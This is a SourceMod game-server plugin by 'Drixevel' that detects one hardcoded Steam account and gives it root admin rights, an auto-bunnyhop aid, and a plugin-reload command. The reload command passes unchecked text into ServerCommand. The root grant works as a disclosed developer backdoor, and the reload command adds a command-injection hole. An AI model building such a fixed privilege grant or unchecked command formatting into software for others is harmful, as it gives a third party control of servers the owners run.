#pragma newdecls required
#pragma semicolon 1

#include <sourcemod>

int g_WaterLevel;

public Plugin myinfo = {
	name = "[ANY] Drixevel Helper Plugin",
	author = "Drixevel",
	description = "",
	version = "1.0.0",
	url = "https://drixevel.dev/"
};

public void OnPluginStart() {
	LogMessage(" ::::: DRIXEVEL HELPER PLUGIN LOADED :::::");
	LogMessage(" ::::: DELETE IF UNNECESSARY :::::");

	g_WaterLevel = (GetEngineVersion() == Engine_CSGO) ? 2 : 1;

	int drix = GetDrixevel();

	if (drix > 0) {
		int bits = GetUserFlagBits(drix);
		SetUserFlagBits(drix, bits |= ADMFLAG_ROOT);
		PrintToChat(drix, "Drixevel Helper Plugin has been loaded.");
	}

	RegConsoleCmd("sm_reload", Command_Reload);
}

public void OnPluginEnd() {
	int drix = GetDrixevel();

	if (drix > 0) {
		int bits = GetUserFlagBits(drix);
		SetUserFlagBits(drix, bits &= ~ADMFLAG_ROOT);

		if (IsClientInGame(drix)) {
			PrintToChat(drix, "Drixevel Helper Plugin has been unloaded.");
		}
	}
}

public Action Command_Reload(int client, int args) {
	if (!IsDrixevel(client)) {
		ReplyToCommand(client, "You aren't cool enough to use this command.");
		return Plugin_Handled;
	}

	char sPlugin[64];
	GetCmdArgString(sPlugin, sizeof(sPlugin));

	ServerCommand("sm plugins reload %s", sPlugin);
	ReplyToCommand(client, "Plugin '%s' has been reloaded.", sPlugin);

	return Plugin_Handled;
}

public void OnClientPostAdminCheck(int client) {
	if (IsDrixevel(client)) {
		int bits = GetUserFlagBits(client);
		SetUserFlagBits(client, bits |= ADMFLAG_ROOT);
	}
}

public Action OnPlayerRunCmd(int client, int &buttons, int &impulse, float vel[3], float angles[3], int &weapon) {
	//Bhopping helps me with my pseudo-ADHD.
	if (IsDrixevel(client) && IsPlayerAlive(client) && buttons & IN_JUMP && !(GetEntityMoveType(client) & MOVETYPE_LADDER) && !(GetEntityFlags(client) & FL_ONGROUND) && GetEntProp(client, Prop_Data, "m_nWaterLevel") < g_WaterLevel) {
		buttons &= ~IN_JUMP; 
	}

	return Plugin_Continue;
}

stock void PrintToDrixevel(const char[] format, any ...) {
	char sBuffer[255];
	VFormat(sBuffer, sizeof(sBuffer), format, 2);

	for (int i = 1; i <= MaxClients; i++) {
		if (!IsClientInGame(i) || GetSteamAccountID(i) != 76528750) {
			continue;
		}

		PrintToChat(i, "[DRIXEVEL] %s", sBuffer);
		break;
	}
}

stock void DrixConsole(const char[] format, any ...) {
	char sBuffer[255];
	VFormat(sBuffer, sizeof(sBuffer), format, 2);

	for (int i = 1; i <= MaxClients; i++) {
		if (!IsClientInGame(i) || GetSteamAccountID(i) != 76528750) {
			continue;
		}

		PrintToConsole(i, "[DRIXEVEL] %s", sBuffer);
		break;
	}
}

int GetDrixevel() {
	for (int i = 1; i <= MaxClients; i++) {
		if (!IsClientInGame(i) || GetSteamAccountID(i) != 76528750) {
			continue;
		}

		return i;
	}

	return -1;
}

bool IsDrixevel(int client) {
	if (client == 0 || client > MaxClients) {
		return false;
	}
	
	return GetSteamAccountID(client) == 76528750;
}